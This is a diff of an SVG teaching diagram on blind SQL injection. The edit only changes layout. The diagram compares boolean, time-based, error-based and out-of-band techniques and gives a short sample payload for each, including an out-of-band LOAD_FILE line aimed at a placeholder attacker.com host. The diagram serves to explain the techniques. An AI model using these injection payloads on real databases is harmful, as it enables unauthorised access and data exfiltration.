@@ -93,35 +93,35 @@
       <path d="M1,2 L9,5 L1,8 Z" fill="#ffffff"/>
     </marker>
 </defs>
-  <text x="615.015" y="51.8919" text-anchor="middle" font-size="27.334" font-weight="bold" fill="var(--text)">Blind SQL Injection Techniques</text>
-  <rect x="51.2512" y="103.7838" width="546.68" height="121.0811" rx="6" fill="var(--primary-fill)" stroke="var(--primary-border)" stroke-width="2" />
-  <text x="324.5913" y="147.027" text-anchor="middle" font-size="20.5005" font-weight="bold" fill="var(--primary-accent)">Boolean-Based Blind</text>
-  <text x="324.5913" y="178.1622" text-anchor="middle" font-size="17.0838" fill="var(--text)">Different response for TRUE vs FALSE</text>
-  <text x="324.5913" y="204.1081" text-anchor="middle" font-size="17.0838" fill="var(--text-muted)" font-family="monospace">1' AND 1=1-- (true) vs 1' AND 1=2-- (false)</text>
-  <rect x="632.0988" y="103.7838" width="546.68" height="121.0811" rx="6" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2" />
-  <text x="905.4388" y="147.027" text-anchor="middle" font-size="20.5005" font-weight="bold" fill="var(--warn-accent)">Time-Based Blind</text>
-  <text x="905.4388" y="178.1622" text-anchor="middle" font-size="17.0838" fill="var(--text)">SLEEP/WAITFOR delays on TRUE</text>
-  <text x="905.4388" y="204.1081" text-anchor="middle" font-size="17.0838" fill="var(--text-muted)" font-family="monospace">1' AND SLEEP(5)-- (5s delay)</text>
-  <rect x="51.2512" y="259.4595" width="546.68" height="121.0811" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2" />
-  <text x="324.5913" y="302.7027" text-anchor="middle" font-size="20.5005" font-weight="bold" fill="var(--danger-accent)">Error-Based</text>
-  <text x="324.5913" y="333.8378" text-anchor="middle" font-size="17.0838" fill="var(--text)">Force errors that leak data</text>
-  <text x="324.5913" y="359.7838" text-anchor="middle" font-size="17.0838" fill="var(--text-muted)" font-family="monospace">EXTRACTVALUE(1, CONCAT(0x7e,...))</text>
-  <rect x="632.0988" y="259.4595" width="546.68" height="121.0811" rx="6" fill="var(--ok-fill)" stroke="var(--ok-border)" stroke-width="2" />
-  <text x="905.4388" y="302.7027" text-anchor="middle" font-size="20.5005" font-weight="bold" fill="var(--ok-accent)">Out-of-Band (OOB)</text>
-  <text x="905.4388" y="333.8378" text-anchor="middle" font-size="17.0838" fill="var(--text)">DNS/HTTP to attacker server</text>
-  <text x="905.4388" y="359.7838" text-anchor="middle" font-size="17.0838" fill="var(--text-muted)" font-family="monospace">LOAD_FILE('\\\\attacker.com\\...')</text>
-  <rect x="102.5025" y="449.7297" width="1025.0251" height="190.2703" rx="6" fill="var(--primary-fill)" stroke="var(--primary-border)" stroke-width="2" />
-  <text x="615.015" y="492.973" text-anchor="middle" font-size="20.5005" font-weight="bold" fill="var(--text)">Technique Comparison</text>
-  <text x="239.1725" y="536.2162" text-anchor="middle" font-size="17.0838" font-weight="bold" fill="var(--primary-accent)">Speed</text>
-  <text x="478.345" y="536.2162" text-anchor="middle" font-size="17.0838" font-weight="bold" fill="var(--primary-accent)">Reliability</text>
-  <text x="734.6012" y="536.2162" text-anchor="middle" font-size="17.0838" font-weight="bold" fill="var(--primary-accent)">Stealthiness</text>
-  <text x="973.7737" y="536.2162" text-anchor="middle" font-size="17.0838" font-weight="bold" fill="var(--primary-accent)">Detection</text>
-  <text x="239.1725" y="579.4595" text-anchor="middle" font-size="17.0838" fill="var(--text)">Boolean: Fast</text>
-  <text x="478.345" y="579.4595" text-anchor="middle" font-size="17.0838" fill="var(--text)">Boolean: High</text>
-  <text x="734.6012" y="579.4595" text-anchor="middle" font-size="17.0838" fill="var(--text)">Time: Low</text>
-  <text x="973.7737" y="579.4595" text-anchor="middle" font-size="17.0838" fill="var(--text)">OOB: Hardest</text>
-  <text x="239.1725" y="614.0541" text-anchor="middle" font-size="17.0838" fill="var(--text)">Time: Slow</text>
-  <text x="478.345" y="614.0541" text-anchor="middle" font-size="17.0838" fill="var(--text)">OOB: Medium</text>
-  <text x="734.6012" y="614.0541" text-anchor="middle" font-size="17.0838" fill="var(--text)">Boolean: Medium</text>
-  <text x="973.7737" y="614.0541" text-anchor="middle" font-size="17.0838" fill="var(--text)">Error: Easiest</text>
+  <text x="640" y="40" text-anchor="middle" font-size="28.0037" font-weight="bold" fill="var(--text)">Blind SQL Injection Techniques</text>
+  <rect x="40" y="91.1765" width="581.8181" height="119.4118" rx="6" fill="var(--primary-fill)" stroke="var(--primary-border)" stroke-width="2" />
+  <text x="330.9092" y="133.8235" text-anchor="middle" font-size="21.0028" font-weight="bold" fill="var(--primary-accent)">Boolean-Based Blind</text>
+  <text x="330.9092" y="164.5294" text-anchor="middle" font-size="17.5024" fill="var(--text)">Different response for TRUE vs FALSE</text>
+  <text x="330.9092" y="190.1176" text-anchor="middle" font-size="17.5024" fill="var(--text-muted)" font-family="monospace">1' AND 1=1-- (true) vs 1' AND 1=2-- (false)</text>
+  <rect x="658.1819" y="91.1765" width="581.8181" height="119.4118" rx="6" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2" />
+  <text x="949.0909" y="133.8235" text-anchor="middle" font-size="21.0028" font-weight="bold" fill="var(--warn-accent)">Time-Based Blind</text>
+  <text x="949.0909" y="164.5294" text-anchor="middle" font-size="17.5024" fill="var(--text)">SLEEP/WAITFOR delays on TRUE</text>
+  <text x="949.0909" y="190.1176" text-anchor="middle" font-size="17.5024" fill="var(--text-muted)" font-family="monospace">1' AND SLEEP(5)-- (5s delay)</text>
+  <rect x="40" y="244.7059" width="581.8181" height="119.4118" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2" />
+  <text x="330.9092" y="287.3529" text-anchor="middle" font-size="21.0028" font-weight="bold" fill="var(--danger-accent)">Error-Based</text>
+  <text x="330.9092" y="318.0588" text-anchor="middle" font-size="17.5024" fill="var(--text)">Force errors that leak data</text>
+  <text x="330.9092" y="343.6471" text-anchor="middle" font-size="17.5024" fill="var(--text-muted)" font-family="monospace">EXTRACTVALUE(1, CONCAT(0x7e,...))</text>
+  <rect x="658.1819" y="244.7059" width="581.8181" height="119.4118" rx="6" fill="var(--ok-fill)" stroke="var(--ok-border)" stroke-width="2" />
+  <text x="949.0909" y="287.3529" text-anchor="middle" font-size="21.0028" font-weight="bold" fill="var(--ok-accent)">Out-of-Band (OOB)</text>
+  <text x="949.0909" y="318.0588" text-anchor="middle" font-size="17.5024" fill="var(--text)">DNS/HTTP to attacker server</text>
+  <text x="949.0909" y="343.6471" text-anchor="middle" font-size="17.5024" fill="var(--text-muted)" font-family="monospace">LOAD_FILE('\\\\attacker.com\\...')</text>
+  <rect x="94.5455" y="432.3529" width="1090.9091" height="187.6471" rx="6" fill="var(--primary-fill)" stroke="var(--primary-border)" stroke-width="2" />
+  <text x="640" y="475" text-anchor="middle" font-size="21.0028" font-weight="bold" fill="var(--text)">Technique Comparison</text>
+  <text x="240" y="517.647" text-anchor="middle" font-size="17.5024" font-weight="bold" fill="var(--primary-accent)">Speed</text>
+  <text x="494.5455" y="517.647" text-anchor="middle" font-size="17.5024" font-weight="bold" fill="var(--primary-accent)">Reliability</text>
+  <text x="767.2727" y="517.647" text-anchor="middle" font-size="17.5024" font-weight="bold" fill="var(--primary-accent)">Stealthiness</text>
+  <text x="1021.8181" y="517.647" text-anchor="middle" font-size="17.5024" font-weight="bold" fill="var(--primary-accent)">Detection</text>
+  <text x="240" y="560.2942" text-anchor="middle" font-size="17.5024" fill="var(--text)">Boolean: Fast</text>
+  <text x="494.5455" y="560.2942" text-anchor="middle" font-size="17.5024" fill="var(--text)">Boolean: High</text>
+  <text x="767.2727" y="560.2942" text-anchor="middle" font-size="17.5024" fill="var(--text)">Time: Low</text>
+  <text x="1021.8181" y="560.2942" text-anchor="middle" font-size="17.5024" fill="var(--text)">OOB: Hardest</text>
+  <text x="240" y="594.4118" text-anchor="middle" font-size="17.5024" fill="var(--text)">Time: Slow</text>
+  <text x="494.5455" y="594.4118" text-anchor="middle" font-size="17.5024" fill="var(--text)">OOB: Medium</text>
+  <text x="767.2727" y="594.4118" text-anchor="middle" font-size="17.5024" fill="var(--text)">Boolean: Medium</text>
+  <text x="1021.8181" y="594.4118" text-anchor="middle" font-size="17.5024" fill="var(--text)">Error: Easiest</text>
 </svg>
